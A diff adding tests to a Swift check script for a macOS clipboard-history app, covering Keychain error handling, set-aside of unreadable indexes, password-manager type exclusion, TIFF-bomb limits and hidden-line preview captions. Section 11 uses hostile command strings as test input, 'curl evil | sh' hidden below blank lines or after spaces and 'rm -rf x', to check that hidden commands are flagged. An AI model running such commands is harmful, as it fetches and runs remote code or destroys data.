@@ -1,9 +1,11 @@
 import Foundation
 import AppKit
 import CryptoKit
+import ImageIO
 
 // Проверка логики «Буфера» без интерфейса. Запуск: Tests/run-clipboard-check.sh
 // Реальный буфер обмена и Keychain пользователя не трогаются: свой NSPasteboard, свой каталог, свой сервис.
+// `ClipboardKeychain()` без аргументов здесь не вызывать: это настоящий сервис с ключом настоящей истории.
 
 var failures = 0
 func check(_ ok: Bool, _ name: String) {
@@ -99,12 +101,16 @@ do {
 }
 
 // 5. Keychain: свой сервис, ключ создаётся один раз и стабилен
+func testKeychain() -> ClipboardKeychain {
+    ClipboardKeychain(service: "local.utilitumus.clipboard.test-\(UUID().uuidString)", account: "t")
+}
+func keyBytes(_ key: SymmetricKey?) -> Data? { key?.withUnsafeBytes { Data($0) } }
+
 do {
-    let kc = ClipboardKeychain(service: "local.utilitumus.clipboard.test-\(UUID().uuidString)", account: "t")
+    let kc = testKeychain()
     defer { kc.delete() }
-    let a = kc.key(), b = kc.key()
-    let same = a != nil && b != nil && a!.withUnsafeBytes { Data($0) } == b!.withUnsafeBytes { Data($0) }
-    check(same, "ключ в Keychain создан и читается тем же")
+    let a = try? kc.key(), b = try? kc.key()
+    check(a != nil && keyBytes(a) == keyBytes(b), "ключ в Keychain создан и читается тем же")
 }
 
 // 6. Реальный NSPasteboard (именованный): скрытый тип, текст, файлы, картинка
@@ -127,6 +133,290 @@ do {
     let count = pb.changeCount
     ClipboardPasteboard.write(store.items[1], imageData: nil, to: pb)
     check(pb.changeCount != count && pb.string(forType: .string) == "https://example.com/a", "запись в буфер возвращает текст")
+}
+
+// 7. Ключ: новый создаётся только при errSecItemNotFound
+do {
+    // Подставной ответ связки: отказ, отмена, запертая связка, сбой. Запись в связку не должна случиться.
+    for status in [errSecAuthFailed, errSecUserCanceled, errSecInteractionNotAllowed, errSecNotAvailable, errSecInternalError] {
+        var added = false
+        var kc = testKeychain()
+        kc.copyItem = { _, _ in status }
+        kc.addItem = { _, _ in added = true; return errSecSuccess }
+        var thrown: OSStatus?
+        do { _ = try kc.key() } catch { thrown = (error as? ClipboardKeychainError)?.status }
+        check(thrown == status && !added, "ошибка \(status): ключ не выдан, новый не создан")
+    }
+
+    // Настоящая запись в тестовом сервисе: отказ при чтении её не меняет.
+    let real = testKeychain()
+    defer { real.delete() }
+    let original = keyBytes(try? real.key())
+    var denied = real
+    denied.copyItem = { _, _ in errSecAuthFailed }
+    check((try? denied.key()) == nil, "отказ связки: ключа нет")
+    check(original != nil && keyBytes(try? real.key()) == original, "отказ связки: прежний ключ на месте")
+
+    // Запись не того размера не заменяется молча.
+    let odd = testKeychain()
+    defer { odd.delete() }
+    let short = Data([1, 2, 3])
+    let attrs: [String: Any] = [kSecClass as String: kSecClassGenericPassword, kSecAttrService as String: odd.service,
+                                kSecAttrAccount as String: odd.account, kSecValueData as String: short]
+    check(SecItemAdd(attrs as CFDictionary, nil) == errSecSuccess, "короткая запись положена")
+    check((try? odd.key()) == nil, "короткая запись: ключа нет")
+    var out: CFTypeRef?
+    let query: [String: Any] = [kSecClass as String: kSecClassGenericPassword, kSecAttrService as String: odd.service,
+                                kSecAttrAccount as String: odd.account, kSecReturnData as String: true]
+    SecItemCopyMatching(query as CFDictionary, &out)
+    check(out as? Data == short, "короткая запись не заменена")
+
+    // Сбой записи нового ключа: ошибка, а не молчаливое продолжение.
+    var failing = testKeychain()
+    failing.addItem = { _, _ in errSecDuplicateItem }
+    check((try? failing.key()) == nil, "новый ключ не записался: ключа нет")
+}
+
+// 8. Индекс, который не открылся, не затирается
+do {
+    let fm = FileManager.default
+    let aside = { (dir: URL) in
+        ((try? fm.contentsOfDirectory(atPath: dir.path)) ?? []).filter { $0.hasPrefix("index-unreadable-") }.sorted()
+    }
+
+    // Чужой ключ: файл отложен байт в байт, новая история его не трогает, со старым ключом читается.
+    let d = root.appendingPathComponent("aside")
+    let first = ClipboardStore(directory: d, key: key)
+    first.ingest(snap("старая запись"))
+    let index = d.appendingPathComponent("index.bin")
+    let bytes = try! Data(contentsOf: index)
+    let other = ClipboardStore(directory: d, key: SymmetricKey(size: .bits256))
+    check(other.items.isEmpty && other.isAvailable, "чужой ключ: история начата заново")
+    check(other.setAsideIndex != nil && !fm.fileExists(atPath: index.path), "чужой ключ: индекс отложен")
+    let name = other.setAsideIndex?.lastPathComponent ?? ""
+    check(name.range(of: #"^index-unreadable-\d{4}-\d{2}-\d{2}-\d{6}\.bin$"#, options: .regularExpression) != nil, "имя с датой: \(name)")
+    other.ingest(snap("новая запись"))
+    check((try? Data(contentsOf: d.appendingPathComponent(name))) == bytes, "отложенный файл не изменился")
+    check((try? Data(contentsOf: index)) != bytes, "новая история пишется в новый индекс")
+    let mode = (try? fm.attributesOfItem(atPath: d.appendingPathComponent(name).path))?[.posixPermissions] as? Int
+    check(mode == 0o600, "отложенный файл с правами 0600")
+
+    let back = root.appendingPathComponent("aside-back")
+    try! fm.createDirectory(at: back, withIntermediateDirectories: true)
+    try! bytes.write(to: back.appendingPathComponent("index.bin"))
+    let restored = ClipboardStore(directory: back, key: key)
+    check(restored.items.map { $0.text } == ["старая запись"] && restored.setAsideIndex == nil, "отложенное читается прежним ключом")
+
+    // Второй сбой в ту же секунду не затирает первый отложенный файл.
+    _ = ClipboardStore(directory: d, key: SymmetricKey(size: .bits256))
+    _ = ClipboardStore(directory: d, key: SymmetricKey(size: .bits256))
+    let names = aside(d)
+    check(names.count >= 2 && names.contains(name) && (try? Data(contentsOf: d.appendingPathComponent(name))) == bytes,
+          "повторный сбой не затирает отложенное (\(names.count) файла)")
+
+    // Расшифровался, но это не индекс: тоже откладывается.
+    let junkDir = root.appendingPathComponent("junk")
+    try! fm.createDirectory(at: junkDir, withIntermediateDirectories: true)
+    try! AES.GCM.seal(Data("не json".utf8), using: key).combined!.write(to: junkDir.appendingPathComponent("index.bin"))
+    let junk = ClipboardStore(directory: junkDir, key: key)
+    check(junk.setAsideIndex != nil && junk.isAvailable, "испорченный JSON отложен")
+
+    // Картинки прежней истории не удаляются при откладывании индекса.
+    let imgDir = root.appendingPathComponent("img")
+    let withImage = ClipboardStore(directory: imgDir, key: key)
+    let png = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: 2, pixelsHigh: 2, bitsPerSample: 8, samplesPerPixel: 4,
+                               hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0)!
+        .representation(using: .png, properties: [:])!
+    withImage.ingest(ClipSnapshot(types: ["public.png"], imagePNG: png))
+    let imageFile = withImage.items[0].imageFile!
+    _ = ClipboardStore(directory: imgDir, key: SymmetricKey(size: .bits256))
+    check(fm.fileExists(atPath: imgDir.appendingPathComponent(imageFile).path), "картинка прежней истории на месте")
+
+    // Не удалось прочитать (нет прав): файл не трогаем и ничего не пишем.
+    let lockedDir = root.appendingPathComponent("locked")
+    ClipboardStore(directory: lockedDir, key: key).ingest(snap("под замком"))
+    let lockedIndex = lockedDir.appendingPathComponent("index.bin")
+    let lockedBytes = try! Data(contentsOf: lockedIndex)
+    try! fm.setAttributes([.posixPermissions: 0o000], ofItemAtPath: lockedIndex.path)
+    let locked = ClipboardStore(directory: lockedDir, key: key)
+    check(!locked.isAvailable && locked.setAsideIndex == nil, "нет прав на чтение: хранилище закрыто")
+    check(!locked.ingest(snap("новое")), "нет прав на чтение: запись не принимается")
+    locked.addSpace(name: "x", colorID: "red")
+    try! fm.setAttributes([.posixPermissions: 0o600], ofItemAtPath: lockedIndex.path)
+    check((try? Data(contentsOf: lockedIndex)) == lockedBytes && aside(lockedDir).isEmpty, "нет прав на чтение: файл не изменён и не отложен")
+
+    // Не удалось отложить: файл на месте, запись закрыта.
+    let stuckDir = root.appendingPathComponent("stuck")
+    ClipboardStore(directory: stuckDir, key: key).ingest(snap("не сдвинуть"))
+    let stuckIndex = stuckDir.appendingPathComponent("index.bin")
+    let stuckBytes = try! Data(contentsOf: stuckIndex)
+    try! fm.setAttributes([.immutable: true], ofItemAtPath: stuckIndex.path)
+    let stuck = ClipboardStore(directory: stuckDir, key: SymmetricKey(size: .bits256))
+    check(!stuck.isAvailable && stuck.setAsideIndex == nil, "не удалось отложить: хранилище закрыто")
+    check(!stuck.ingest(snap("новое")), "не удалось отложить: запись не принимается")
+    try! fm.setAttributes([.immutable: false], ofItemAtPath: stuckIndex.path)
+    check((try? Data(contentsOf: stuckIndex)) == stuckBytes, "не удалось отложить: файл не изменён")
+
+    // Формат существующей истории: JSON старой версии читается, хэш прежний, повтор не дублируется.
+    let oldDir = root.appendingPathComponent("old-format")
+    try! fm.createDirectory(at: oldDir, withIntermediateDirectories: true)
+    let oldText = "запись старой версии"
+    var hasher = SHA256()
+    hasher.update(data: Data("text".utf8))
+    hasher.update(data: Data(oldText.utf8))
+    let oldHash = hasher.finalize().map { String(format: "%02x", $0) }.joined()
+    let oldJSON = """
+    {"items":[{"id":"6E1B2C3D-0000-4000-8000-000000000001","hash":"\(oldHash)","kind":"text","text":"\(oldText)",\
+    "sourceBundleID":"com.example.app","sourceName":"App","date":700000000,\
+    "spaceID":"6E1B2C3D-0000-4000-8000-000000000002"}],\
+    "spaces":[{"id":"6E1B2C3D-0000-4000-8000-000000000002","name":"Старое","colorID":"blue"}]}
+    """
+    try! AES.GCM.seal(Data(oldJSON.utf8), using: key).combined!.write(to: oldDir.appendingPathComponent("index.bin"))
+    let old = ClipboardStore(directory: oldDir, key: key)
+    check(old.items.first?.text == oldText && old.spaces.first?.name == "Старое" && old.setAsideIndex == nil, "история старого формата читается")
+    old.ingest(snap(oldText))
+    check(old.items.count == 1 && old.items[0].spaceID != nil, "повтор находит старую запись по прежнему хэшу")
+}
+
+// 9. Исключения: источник — и текущая программа, и те, что были впереди в последние 2 секунды
+do {
+    let t0 = Date(timeIntervalSince1970: 1000)
+    var front = ClipFrontHistory(current: "com.apple.keychainaccess")
+    check(front.sources(now: t0) == ["com.apple.keychainaccess"], "текущая программа — источник")
+    front.activated("com.apple.Safari", now: t0)
+    check(Set(front.sources(now: t0.addingTimeInterval(0.5))) == ["com.apple.keychainaccess", "com.apple.Safari"], "через 0,5 с ушедшая ещё источник")
+    check(front.sources(now: t0.addingTimeInterval(2)).contains("com.apple.keychainaccess"), "через 2 с ещё источник")
+    check(front.sources(now: t0.addingTimeInterval(2.01)) == ["com.apple.Safari"], "позже 2 с только текущая")
+    front.activated("com.apple.Safari", now: t0.addingTimeInterval(3))
+    check(front.sources(now: t0.addingTimeInterval(3)) == ["com.apple.Safari"], "повторная активация той же не делает её ушедшей")
+    front.activated(nil, now: t0.addingTimeInterval(4))
+    check(front.sources(now: t0.addingTimeInterval(4)) == ["com.apple.Safari"], "программа без bundle id ничего не добавляет")
+
+    let store = ClipboardStore(directory: root.appendingPathComponent("legacy-types"), key: key)
+    for type in ["com.agilebits.onepassword", "net.antelle.keeweb", "de.petermaurer.TransientPasteboardType",
+                 "Pasteboard generator type", "com.typeit4me.clipping"] {
+        check(!store.ingest(snap("секрет", types: ["public.utf8-plain-text", type])), "тип \(type) пропущен")
+    }
+    check(store.items.isEmpty, "после старых пометок история пуста")
+    check(store.ingest(snap("обычный текст")), "обычный текст сохраняется")
+}
+
+// 10. Большое содержимое: обрезка без обхода всего текста, размер TIFF до декодирования, чтение вне главного потока
+do {
+    func ms(_ body: () -> Void) -> Double {
+        let start = Date()
+        body()
+        return Date().timeIntervalSince(start) * 1000
+    }
+    let maxLen = ClipboardPolicy.maxTextLength
+
+    check(ClipboardPolicy.trimmedText("коротко") == "коротко", "короткий текст не меняется")
+    // Обрезка та же, что была: по символам. Иначе русский текст стал бы короче, а хэш другим.
+    let russian = String(repeating: "я", count: 15_000)
+    check(ClipboardPolicy.trimmedText(russian) == russian, "15 000 русских букв (30 000 байт) не обрезаются")
+    let long = String(repeating: "я", count: 25_000)
+    check(ClipboardPolicy.trimmedText(long) == String(long.prefix(maxLen)), "25 000 русских букв обрезаются до 20 000 символов")
+    let ascii = String(repeating: "a", count: 25_000)
+    check(ClipboardPolicy.trimmedText(ascii) == String(ascii.prefix(maxLen)), "25 000 латинских обрезаются до 20 000")
+    let family = String(repeating: "👨‍👩‍👧‍👦", count: 25_000)
+    let cutFamily = ClipboardPolicy.trimmedText(family)
+    check(cutFamily.utf8.count <= ClipboardPolicy.maxTextBytes && !cutFamily.unicodeScalars.contains("\u{FFFD}"), "обрезка по байтам не режет символ")
+    check(ClipboardPolicy.trimmedText(cutFamily) == cutFamily, "повторная обрезка ничего не меняет")
+
+    let huge = String(repeating: "a", count: 50_000_000)
+    let hugeTime = ms { _ = ClipboardPolicy.trimmedText(huge) }
+    check(hugeTime < 200, "50 МБ текста обрезаются быстро: \(Int(hugeTime)) мс")
+    let zalgo = "a" + String(repeating: "\u{0301}", count: 5_000_000)
+    var cutZalgo = ""
+    let zalgoTime = ms { cutZalgo = ClipboardPolicy.trimmedText(zalgo) }
+    check(zalgoTime < 500 && cutZalgo.utf8.count <= ClipboardPolicy.maxTextBytes, "один символ в 10 МБ не обходится весь: \(Int(zalgoTime)) мс")
+
+    check(ClipboardPolicy.tiffFits(bytes: 100_000_000, width: 6016, height: 3384), "снимок экрана 6K в TIFF проходит")
+    check(!ClipboardPolicy.tiffFits(bytes: ClipboardPolicy.maxTIFFBytes + 1, width: 10, height: 10), "TIFF больше предела в байтах отвергается")
+    check(!ClipboardPolicy.tiffFits(bytes: 1000, width: 100_000, height: 100_000), "TIFF больше предела в пикселях отвергается")
+    check(!ClipboardPolicy.tiffFits(bytes: 1000, width: Int.max, height: 2), "большие размеры не переполняют расчёт")
+
+    let pb = NSPasteboard(name: NSPasteboard.Name("local.utilitumus.clipcheck.\(UUID().uuidString)"))
+    defer { pb.releaseGlobally() }
+
+    // Обычный TIFF по-прежнему становится PNG.
+    let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: 7, pixelsHigh: 5, bitsPerSample: 8, samplesPerPixel: 4,
+                               hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB, bytesPerRow: 0, bitsPerPixel: 0)!
+    pb.clearContents(); pb.setData(rep.tiffRepresentation!, forType: .tiff)
+    let converted = ClipboardPasteboard.snapshot(of: pb).imagePNG
+    check(converted != nil && NSBitmapImageRep(data: converted!)?.pixelsWide == 7, "обычный TIFF стал PNG")
+
+    // Настоящий сжатый TIFF: файл маленький, а распакованный занял бы сотни мегабайт.
+    let context = CGContext(data: nil, width: 9000, height: 8000, bitsPerComponent: 8, bytesPerRow: 9000,
+                            space: CGColorSpaceCreateDeviceGray(), bitmapInfo: CGImageAlphaInfo.none.rawValue)!
+    let bombData = NSMutableData()
+    let destination = CGImageDestinationCreateWithData(bombData, "public.tiff" as CFString, 1, nil)!
+    let options = [kCGImagePropertyTIFFDictionary: [kCGImagePropertyTIFFCompression: 5]] as CFDictionary
+    CGImageDestinationAddImage(destination, context.makeImage()!, options)
+    check(CGImageDestinationFinalize(destination) && bombData.length < 2_000_000, "сжатый TIFF собран: \(bombData.length) байт")
+    let header = CGImageSourceCreateWithData(bombData, nil).flatMap { CGImageSourceCopyPropertiesAtIndex($0, 0, nil) } as? [CFString: Any]
+    check(header?[kCGImagePropertyPixelWidth] as? Int == 9000, "размер TIFF читается из заголовка")
+    pb.clearContents(); pb.setData(bombData as Data, forType: .tiff)
+    var bombPNG: Data?
+    let bombTime = ms { bombPNG = ClipboardPasteboard.snapshot(of: pb).imagePNG }
+    check(bombPNG == nil && bombTime < 200, "72 Мпикс TIFF не декодируется: \(Int(bombTime)) мс")
+
+    pb.clearContents(); pb.setData(Data(count: ClipboardPolicy.maxImageBytes + 1), forType: .png)
+    check(ClipboardPasteboard.snapshot(of: pb).imagePNG == nil, "PNG больше предела не читается в снимок")
+
+    // Снимок вне главного потока и проверка, что буфер не поменялся.
+    pb.clearContents(); pb.setString("обычное копирование", forType: .string)
+    let change = pb.changeCount
+    let done = DispatchSemaphore(value: 0)
+    nonisolated(unsafe) var fromQueue: ClipSnapshot?
+    nonisolated(unsafe) let shared = pb
+    DispatchQueue(label: "clipcheck.read").async {
+        fromQueue = ClipboardPasteboard.snapshot(of: shared, change: change)
+        done.signal()
+    }
+    done.wait()
+    check(fromQueue?.text == "обычное копирование", "снимок вне главного потока читается")
+    pb.clearContents(); pb.setString("новое", forType: .string)
+    check(ClipboardPasteboard.snapshot(of: pb, change: change) == nil, "буфер поменялся: старый снимок не берём")
+
+    // Обычное копирование: чтение и запись в историю остаются быстрыми.
+    let store = ClipboardStore(directory: root.appendingPathComponent("speed"), key: key)
+    var total = 0.0
+    let runs = 200
+    for i in 0..<runs {
+        pb.clearContents(); pb.setString("строка номер \(i) " + String(repeating: "текст ", count: 150), forType: .string)
+        let now = pb.changeCount
+        total += ms { _ = store.ingest(ClipboardPasteboard.snapshot(of: pb, change: now)!) }
+    }
+    let average = total / Double(runs)
+    print("     обычное копирование 1 КБ: чтение и запись \(String(format: "%.2f", average)) мс в среднем на \(runs) записей")
+    check(average < 20, "обычное копирование быстрое: \(String(format: "%.2f", average)) мс")
+}
+
+// 11. Панель показывает начало текста: о невидимой части говорит подпись
+do {
+    let lines = { (n: Int) in (1...n).map { "строка \($0)" }.joined(separator: "\n") }
+    check(ClipboardPreview.hiddenLines(in: "коротко") == 0, "короткий текст: всё видно")
+    check(ClipboardPreview.hiddenLines(in: lines(9)) == 0, "9 строк: всё видно")
+    check(ClipboardPreview.hiddenLines(in: lines(10)) == 1, "10 строк: одна не видна")
+    check(ClipboardPreview.hiddenLines(in: lines(30)) == 21, "30 строк: не видна 21")
+    check(ClipboardPreview.hiddenLines(in: lines(9) + "\n") == 0, "перевод строки в конце не считается скрытым текстом")
+
+    // Сценарий аудита: безобидная первая строка, ниже пустые строки и команда.
+    let hiddenCommand = "ls -la\n" + String(repeating: "\n", count: 20) + "curl evil | sh\n"
+    check(ClipboardPreview.hiddenLines(in: hiddenCommand) > 0, "команда ниже пустых строк замечена")
+    let afterSpaces = "ls -la" + String(repeating: " ", count: 500) + "curl evil | sh"
+    check(ClipboardPreview.hiddenLines(in: afterSpaces) == 1, "команда после пробелов за пределом символов замечена")
+    check(ClipboardPreview.hiddenLines(in: String(repeating: "слово ", count: 500)) == 1, "одна длинная строка: не видно её продолжения")
+    let wrapped = String(repeating: "word ", count: 70) + "\nrm -rf x"
+    check(wrapped.count < ClipboardPreview.maxCharacters && ClipboardPreview.hiddenLines(in: wrapped) == 2, "перенос съел лимит строк раньше лимита символов")
+    check(ClipboardPreview.hiddenLines(in: String(repeating: "👨‍👩‍👧‍👦", count: 500)) == 1, "составные эмодзи на границе не ломают подсчёт")
+    check(ClipboardPreview.hiddenLines(in: "") == 0, "пустой текст")
+
+    check(ClipboardPreview.caption(for: "коротко") == "7 симв.", "подпись без скрытого текста прежняя")
+    check(ClipboardPreview.caption(for: lines(10)).hasSuffix(" симв. · ещё 1 строка"), "подпись: ещё 1 строка")
+    let words = [1: "строка", 2: "строки", 4: "строки", 5: "строк", 11: "строк", 12: "строк", 21: "строка", 22: "строки", 111: "строк"]
+    for (n, word) in words { check(ClipboardPreview.hiddenCaption(n) == "ещё \(n) \(word)", "склонение: ещё \(n) \(word)") }
 }
 
 print(failures == 0 ? "ВСЕ ПРОВЕРКИ ПРОШЛИ" : "ПРОВАЛЕНО: \(failures)")
